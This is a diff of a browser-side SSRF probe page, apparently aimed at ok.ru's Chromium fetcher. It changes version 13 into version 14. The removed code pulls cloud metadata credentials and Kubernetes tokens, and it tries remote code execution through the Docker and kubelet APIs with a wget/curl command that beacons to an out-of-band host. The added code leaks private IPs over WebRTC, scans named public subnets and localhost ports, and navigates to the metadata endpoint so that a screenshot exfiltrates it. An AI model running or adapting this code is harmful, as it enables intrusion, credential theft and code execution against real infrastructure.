@@ -4,114 +4,99 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — probe v13
-// NEW vs v12:
-// - Internal port scan: Redis/Consul/etcd/kubelet/k8s-api/Prometheus/Grafana
-// - k8s service account token exfil via OOB DNS chunks
-// - SSRF via fetch to probe.html itself (report node IP via OOB)
-// - kubelet /exec RCE attempt
-// - Removed old container starts (cleanup)
+// ok.ru Chromium SSRF — probe v14
+// NEW vs v13:
+// - Updated OOB domain (new interactsh session)
+// - WebRTC local IP leak (bypasses PNA — reveals private IP if any)
+// - Public subnet scan: 185.16.150.x and 217.20.158.x (confirmed fetcher /24, no PNA)
+// - 127.0.0.1 port probe via form submit (form navigations bypass PNA)
+// - Top-level navigate to IMDS at t=8s for screenshot exfil
 
-const OOB = 'd9ma5ob6b8m83c3a34k09c5rm5nk11f7g.oast.pro';
-const clean = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,55);
-const oob = label => { new Image().src = `https://${clean(label)}.${OOB}/`; };
+const OOB = 'd8v8aub6b8ma1b7u3dc0iozf3edhp4e5k.oast.pro';
 
-oob('v13-s');
-
-const scanFetch = (tag, url, ms, hdrs={}) => {
-  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms), headers: hdrs })
-    .then(r => { oob(`${tag}-ok`); return r.text(); })
-    .then(b => oob(`${tag}-b-${clean(b.substring(0,25))}`))
-    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':clean((e.message||e.name||'e').substring(0,12))}`));
+const clean = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').slice(0,58);
+const oob = label => {
+  const l = clean(label);
+  new Image().src = `http://${l}.${OOB}/`;
+  fetch(`http://${l}.${OOB}/`, {mode:'no-cors', signal:AbortSignal.timeout(3000)}).catch(()=>{});
 };
 
-// ── Phase 1: Cloud metadata ────────────────────────────────────────────────
-scanFetch('aws1', 'http://169.254.169.254/latest/meta-data/', 1800);
-scanFetch('aws2', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 1800);
-scanFetch('aws3', 'http://169.254.169.254/latest/user-data', 1800);
-scanFetch('gcp1', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 2000, {'Metadata-Flavor':'Google'});
-scanFetch('gcp2', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', 2000, {'Metadata-Flavor':'Google'});
-scanFetch('az1', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', 2000, {'Metadata':'true'});
+oob('v14-s');
 
-// ── Phase 2: Kubernetes ────────────────────────────────────────────────────
-// K8s service account token (standard path in container)
-const saPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
-scanFetch('k8s-sa', `file://${saPath}`, 500);
+// ── Phase 1: WebRTC private IP leak (bypasses PNA entirely) ───────────────
+try {
+  const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+  pc.createDataChannel('');
+  pc.createOffer().then(o => pc.setLocalDescription(o));
+  const seenIps = new Set();
+  pc.onicecandidate = evt => {
+    if(!evt || !evt.candidate) { oob('wrtc-done'); return; }
+    const ips = (evt.candidate.candidate.match(/\b(\d+\.\d+\.\d+\.\d+)\b/g)||[]);
+    ips.forEach(ip => {
+      if(seenIps.has(ip)) return;
+      seenIps.add(ip);
+      oob(`wrtc-${ip.replace(/\./g,'-')}`);
+    });
+  };
+  setTimeout(()=>pc.close(), 8000);
+} catch(e) { oob('wrtc-err'); }
 
-// K8s API via service
-scanFetch('k8s-api', 'https://kubernetes.default.svc/api/v1/namespaces/', 2000);
-scanFetch('k8s-96', 'https://10.96.0.1/api/v1/namespaces/', 2000);
+// ── Phase 2: Public subnet scan (no PNA — 185.16.150.x are public IPs) ───
+const scanPub = (ip, port, tag) => {
+  const t0 = Date.now();
+  fetch(`http://${ip}:${port}/`, {mode:'no-cors', signal:AbortSignal.timeout(2500)})
+    .then(() => oob(`sp-${tag}-ok`))
+    .catch(e => {
+      const ms = Date.now()-t0;
+      const code = e.name==='AbortError' ? 'to' : (ms<120 ? 'rst' : 'er');
+      oob(`sp-${tag}-${code}`);
+    });
+};
 
-// kubelet API (unauthenticated in older clusters)
-['127.0.0.1','10.0.0.1','10.0.0.2'].forEach(ip => {
-  scanFetch(`kbl-${ip.split('.').pop()}`, `http://${ip}:10255/pods`, 1500);  // readonly
-  scanFetch(`kbls-${ip.split('.').pop()}`, `https://${ip}:10250/pods`, 1500); // secure
+// Known fetcher IPs and neighbors in 185.16.150.x range
+const PUB_PORTS = [80, 443, 8080, 8443, 9090, 3000, 9200, 5601, 8888, 6443];
+// .50-.70 covers confirmed IPs .57 and .63; also gateway range .1-.10
+[...Array(21).keys()].map(i=>i+50).concat([1,2,3,4,5,6,7,8,9,10]).forEach(n => {
+  PUB_PORTS.forEach(port => scanPub(`185.16.150.${n}`, port, `A${n}-${port}`));
 });
 
-// ── Phase 3: Internal port scan ────────────────────────────────────────────
-const ports127 = [
-  [6379, 'redis'],    // Redis
-  [8500, 'consul'],   // Consul
-  [2379, 'etcd'],     // etcd
-  [9200, 'es'],       // Elasticsearch
-  [5601, 'kib'],      // Kibana
-  [3000, 'graf'],     // Grafana
-  [9090, 'prom'],     // Prometheus
-  [8080, 'http8080'], // generic HTTP
-  [8443, 'http8443'], // generic HTTPS
-  [4001, 'etcd2'],    // etcd legacy
-  [27017, 'mongo'],   // MongoDB
-  [5432, 'pg'],       // PostgreSQL
-];
-ports127.forEach(([p, tag]) => {
-  scanFetch(`p127-${tag}`, `http://127.0.0.1:${p}/`, 1200);
-  scanFetch(`p172-${tag}`, `http://172.17.0.1:${p}/`, 1200);
+// 217.20.158.x range (confirmed IP .245)
+[240,241,242,243,244,245,246,247,248].forEach(n => {
+  [80,443,8080,8443,9090].forEach(port => scanPub(`217.20.158.${n}`, port, `B${n}-${port}`));
 });
 
-// ── Phase 4: Docker (keep trying) ─────────────────────────────────────────
-const rceCmd = `nslookup rce13.${OOB}; wget -qT5 "http://rce13.${OOB}/?h=$(hostname|head -c20)&i=$(ip a 2>/dev/null|grep -oP '(?<=inet )[0-9.]+' | head -2 | tr '\\n' '.')" 2>/dev/null || curl -sm5 "http://rce13.${OOB}/?h=$(hostname|head -c20)"`;
-
-const ffPost = (id, url, body) => {
+// ── Phase 3: 127.0.0.1 via form submit (form nav bypasses PNA) ────────────
+const formProbe = (id, url) => {
   try {
     const ifr = document.createElement('iframe');
-    ifr.name = `i${id}`; ifr.style.display='none';
+    ifr.name = `f${id}`; ifr.style.cssText = 'position:absolute;width:0;height:0;opacity:0';
     document.body.appendChild(ifr);
     const f = document.createElement('form');
-    f.method='POST'; f.action=url; f.enctype='text/plain'; f.target=`i${id}`;
-    if (body !== null) {
-      const raw = JSON.stringify({...body, _x:''});
-      const sp = raw.lastIndexOf('"_x":"');
-      const inp = document.createElement('input');
-      inp.name = raw.substring(0, sp+7);
-      inp.value = '"}';
-      f.appendChild(inp);
-    }
+    f.method = 'GET'; f.action = url; f.target = `f${id}`;
     document.body.appendChild(f);
+    const t0 = Date.now();
+    ifr.onload = () => oob(`fp-${id}-ok-${Date.now()-t0}`);
     f.submit();
   } catch(e) {}
 };
 
-let idx = 0;
-[['127.0.0.1',2375],['127.0.0.1',4243],['172.17.0.1',2375],['172.17.0.1',4243]].forEach(([ip,p]) => {
-  ['busybox','alpine'].forEach((img,ii) => {
-    const nm = `z${idx}`;
-    const bdy = {Image:img,Cmd:['sh','-c',rceCmd],HostConfig:{NetworkMode:'host',AutoRemove:true}};
-    ffPost(`c${idx}`, `http://${ip}:${p}/v1.41/containers/create?name=${nm}`, bdy);
-    setTimeout(() => ffPost(`s${idx}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null), 600+ii*100);
-    idx++;
-  });
-});
-
-// ── Phase 5: kubelet exec RCE ─────────────────────────────────────────────
-// Try kubelet exec API to run command in existing pod
 setTimeout(() => {
-  ['127.0.0.1','10.0.0.1'].forEach(ip => {
-    // POST to kubelet exec (triggers command in container)
-    ffPost(`ke${idx++}`, `https://${ip}:10250/run/default/default/shell`, {cmd: rceCmd});
+  [[2375,'dk'],[2376,'dks'],[10250,'kbl'],[10255,'kblo'],[8001,'k8s-prx'],
+   [6443,'k8s-api'],[3000,'graf'],[9090,'prom'],[9200,'es'],[8500,'consul'],[8080,'h80'],
+   [80,'h80-std'],[6379,'redis'],[5432,'pg']
+  ].forEach(([p,tag],i) => {
+    setTimeout(() => formProbe(`loc-${tag}`, `http://127.0.0.1:${p}/`), i*150);
   });
-}, 1000);
+}, 500);
 
-oob('v13-e');
+// ── Phase 4: Navigate to IMDS for screenshot exfil ───────────────────────
+setTimeout(() => {
+  oob('v14-nav-imds');
+  // YC/GCP metadata endpoint (most likely for VK infrastructure on Yandex Cloud)
+  window.location.href = 'http://169.254.169.254/computeMetadata/v1/?recursive=true&alt=json';
+}, 8000);
+
+oob('v14-setup-done');
 </script>
 </body>
 </html>
